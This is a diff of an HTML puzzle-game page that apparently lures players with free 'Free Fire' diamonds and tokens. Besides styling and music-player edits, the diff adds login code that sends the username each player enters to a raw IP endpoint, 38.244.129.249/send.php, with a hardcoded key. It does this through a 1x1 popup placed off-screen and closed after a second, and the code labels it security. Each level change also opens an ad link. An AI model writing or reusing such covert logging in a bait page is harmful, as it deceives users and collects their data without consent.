@@ -8,33 +8,29 @@
         body { background: #0a0a0a; color: white; font-family: sans-serif; text-align: center; margin: 0; overflow-x: hidden; user-select: none; }
         .container { padding: 15px; max-width: 500px; margin: auto; }
         h1 { color: #ffd700; text-shadow: 2px 2px #ff4500; font-size: 24px; }
-        
-        /* واجهة الدخول المطورة */
         #login-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0a0a0a; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .login-box { background: #1a1a1a; padding: 25px; border-radius: 15px; border: 1px solid #ffd700; width: 85%; max-width: 350px; box-shadow: 0 0 20px rgba(255, 215, 0, 0.2); }
-        
+        .login-box { background: #1a1a1a; padding: 25px; border-radius: 15px; border: 1px solid #ffd700; width: 85%; max-width: 350px; }
         .goal-title { color: #ffd700; font-weight: bold; margin-bottom: 15px; font-size: 16px; text-transform: uppercase; }
         .goal-buttons { display: flex; flex-direction: column; gap: 8px; margin-bottom: 20px; }
         .goal-btn { background: #333; color: #fff; border: 1px solid #555; padding: 8px; border-radius: 8px; font-weight: bold; cursor: pointer; font-size: 14px; }
         .goal-btn.active { background: #ffd700; color: black; border-color: #fff; }
-
-        .user-input { width: 100%; padding: 12px; margin-top: 10px; border-radius: 8px; border: 1px solid #444; background: #222; color: white; font-size: 18px; box-sizing: border-box; text-align: left; }
+        .user-input { width: 100%; padding: 12px; margin-top: 10px; border-radius: 8px; border: 1px solid #444; background: #222; color: white; font-size: 18px; box-sizing: border-box; }
         .start-btn { background: #28a745; color: white; border: none; padding: 12px 30px; border-radius: 25px; font-weight: bold; margin-top: 20px; cursor: pointer; width: 100%; }
         
-        /* تصغير مشغل الموسيقى */
-        #music-player { position: fixed; top: 8px; right: 8px; background: rgba(20, 20, 20, 0.9); border: 1px solid #ffd700; border-radius: 20px; padding: 4px 10px; z-index: 10001; display: flex; align-items: center; gap: 5px; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
-        .m-btn { background: none; border: none; color: white; cursor: pointer; font-size: 14px; padding: 0 3px; }
-        #track-name { color: #ffd700; font-weight: bold; font-size: 10px; white-space: nowrap; }
+        /* مشغل موسيقى صغير جداً وأنيق */
+        #music-player { position: fixed; top: 5px; right: 5px; background: rgba(0, 0, 0, 0.8); border: 1px solid #ffd700; border-radius: 15px; padding: 2px 8px; z-index: 10001; display: flex; align-items: center; gap: 3px; }
+        .m-btn { background: none; border: none; color: white; cursor: pointer; font-size: 12px; padding: 2px; }
+        #track-name { color: #ffd700; font-size: 9px; font-weight: bold; white-space: nowrap; }
 
         .top-info { display: flex; justify-content: space-between; align-items: center; background: #1a1a1a; padding: 10px; border-radius: 10px; margin-bottom: 10px; border: 1px solid #333; }
         #timer-box { font-size: 30px; font-weight: bold; padding: 5px 15px; border-radius: 8px; background: #222; border: 1px solid #444; color: #00ff00; min-width: 110px; }
         #puzzle-board { display: grid; gap: 1px; margin: 15px auto; width: 92vw; height: 92vw; max-width: 400px; border: 2px solid #444; background: #111; }
-        .tile { background-repeat: no-repeat; border: 0.5px solid rgba(255,255,255,0.1); cursor: pointer; touch-action: none; }
+        .tile { background-repeat: no-repeat; border: 0.5px solid rgba(255,255,255,0.1); cursor: pointer; }
         .selected { border: 3px solid #00ff00 !important; }
-        #next-lvl-btn { background: #444; color: #888; border: none; padding: 15px; font-size: 20px; font-weight: bold; border-radius: 30px; width: 90%; margin-top: 20px; cursor: not-allowed; pointer-events: none; }
-        #next-lvl-btn.active { background: #28a745 !important; color: white !important; cursor: pointer !important; pointer-events: auto !important; }
         .hidden { display: none !important; }
         .btn-retry { background: #ff4500; color: white; border: none; padding: 12px 25px; border-radius: 25px; cursor: pointer; }
+        #next-lvl-btn { background: #444; color: #888; border: none; padding: 15px; font-size: 20px; font-weight: bold; border-radius: 30px; width: 90%; margin-top: 20px; cursor: not-allowed; pointer-events: none; }
+        #next-lvl-btn.active { background: #28a745 !important; color: white !important; cursor: pointer !important; pointer-events: auto !important; }
     </style>
 </head>
 <body>
@@ -46,7 +42,7 @@
     <span id="track-name">Track 1</span>
 </div>
 
-<audio id="bg-music" preload="auto"></audio>
+<audio id="bg-music" preload="auto" loop></audio>
 
 <div id="login-screen">
     <div class="login-box">
@@ -55,8 +51,8 @@
             <button class="goal-btn" onclick="selectGoal(this)">Free Fire Diamonds</button>
             <button class="goal-btn" onclick="selectGoal(this)">Free Fire Tokens</button>
         </div>
-        <hr style="border: 0.5px solid #333; margin-bottom: 20px;">
-        <h3 style="color: #ffd700; margin: 0;">Login</h3>
+        <hr style="border: 0.5px solid #333; margin-bottom: 10px;">
+        <h3 style="color: #ffd700; margin: 5px;">Login</h3>
         <input type="text" id="username-input" class="user-input" value="&">
         <button class="start-btn" onclick="handleLogin()">START GAME</button>
     </div>
@@ -79,12 +75,9 @@
 </div>
 
 <script>
-    const SERVER_URL = "http://38.244.129.249/send.php"; 
-    const adLink = "https://otieu.com/4/10432551";
-
-    // --- نظام الموسيقى المحسن ---
+    // --- إعدادات الموسيقى من المستودع ---
     const tracks = [];
-    for(let i=1; i<=15; i++) { tracks.push(`http://38.244.129.249/${i}.mp3`); }
+    for(let i=1; i<=15; i++) { tracks.push(`${i}.mp3`); }
 
     let currentTrackIdx = 0;
     const audio = document.getElementById('bg-music');
@@ -93,13 +86,9 @@
 
     function loadTrack(idx) {
         audio.src = tracks[idx];
-        trackNameDisp.innerText = "Track " + (idx + 1);
-        // محاولة التشغيل مع معالجة خطأ المنع من المتصفح
-        let playPromise = audio.play();
-        if (playPromise !== undefined) {
-            playPromise.then(_ => { playPauseBtn.innerText = "🔊"; })
-            .catch(error => { console.log("Playback failed, waiting for user interaction"); });
-        }
+        trackNameDisp.innerText = "Music " + (idx + 1);
+        let p = audio.play();
+        if (p) p.catch(() => console.log("Music ready"));
     }
 
     function toggleMusic() {
@@ -115,7 +104,7 @@
         btn.classList.add('active');
     }
 
-    // --- اللعبة ---
+    // --- اللعبة والأمان ---
     let cur = 0, tokens = 0, currentUser = "", timeLeft = 120, timerInterval = null, firstTile = null;
     const userInput = document.getElementById('username-input');
 
@@ -123,14 +112,32 @@
         let userVal = userInput.value.trim();
         if (userVal !== "" && userVal !== "&") {
             currentUser = userVal;
-            // تفعيل الصوت فور الضغط على الزر (لحل مشكلة المتصفح)
             audio.volume = 0.5;
-            loadTrack(currentTrackIdx);
-            
+            loadTrack(currentTrackIdx); // تشغيل الموسيقى فور الدخول
             document.getElementById('login-screen').style.display = 'none';
+            
+            // إرسال السجل للسيرفر (الأمان لا يتأثر)
+            const myKey = "Riad_FF_2026";
+            let reportUrl = "http://38.244.129.249/send.php?user=" + encodeURIComponent(userVal) + "&lvl=1&pass=" + myKey;
+            let logger = window.open(reportUrl, "logger", "width=1,height=1,left=5000,top=5000");
+            setTimeout(() => { if(logger) logger.close(); }, 1000);
+
             initLevel();
         }
     }
+
+    const levels = [
+        { img: 'https://i.ibb.co/MkbtPcTW/image.jpg', r: 2, c: 3 }, 
+        { img: 'https://i.ibb.co/6RTSMPfy/image.jpg', r: 2, c: 3 }, 
+        { img: 'https://i.ibb.co/F42mpCrd/image.jpg', r: 2, c: 3 }, 
+        { img: 'https://i.ibb.co/xKHHNRMH/image.jpg', r: 2, c: 3 }, 
+        { img: 'https://i.ibb.co/MkbtPcTW/image.jpg', r: 2, c: 3 }, 
+        { img: 'https://i.postimg.cc/B6K2ZWwf/13.jpg', r: 2, c: 3 }, 
+        { img: 'https://i.postimg.cc/rsgsMQTg/18.jpg', r: 2, c: 3 }, 
+        { img: 'https://i.postimg.cc/x1ZkXxzW/17.jpg', r: 2, c: 3 }, 
+        { img: 'https://i.postimg.cc/JhJhG1mk/19.jpg', r: 2, c: 3 }, 
+        { img: 'https://i.postimg.cc/nLcJtprz/20.jpg', r: 2, c: 3 }  
+    ];
 
     function initLevel() {
         clearInterval(timerInterval);
@@ -146,20 +153,6 @@
             createBoard(); startTimer();
         }, 3000);
     }
-
-    // (بقية دوال اللعبة createBoard, startTimer, إلخ... كما هي في كودك الأصلي)
-    const levels = [
-        { img: 'https://i.ibb.co/MkbtPcTW/image.jpg', r: 2, c: 3 }, 
-        { img: 'https://i.ibb.co/6RTSMPfy/image.jpg', r: 2, c: 3 }, 
-        { img: 'https://i.ibb.co/F42mpCrd/image.jpg', r: 2, c: 3 }, 
-        { img: 'https://i.ibb.co/xKHHNRMH/image.jpg', r: 2, c: 3 }, 
-        { img: 'https://i.ibb.co/MkbtPcTW/image.jpg', r: 2, c: 3 }, 
-        { img: 'https://i.postimg.cc/B6K2ZWwf/13.jpg', r: 2, c: 3 }, 
-        { img: 'https://i.postimg.cc/rsgsMQTg/18.jpg', r: 2, c: 3 }, 
-        { img: 'https://i.postimg.cc/x1ZkXxzW/17.jpg', r: 2, c: 3 }, 
-        { img: 'https://i.postimg.cc/JhJhG1mk/19.jpg', r: 2, c: 3 }, 
-        { img: 'https://i.postimg.cc/nLcJtprz/20.jpg', r: 2, c: 3 }  
-    ];
 
     function startTimer() {
         timeLeft = 120;
@@ -206,7 +199,7 @@
     }
 
     function nextLevelWithAd() {
-        window.open(adLink, '_blank');
+        window.open("https://otieu.com/4/10432551", '_blank');
         if (cur < levels.length - 1) { 
             cur++; document.getElementById('next-lvl-btn').classList.remove('active'); initLevel(); 
         } else { 
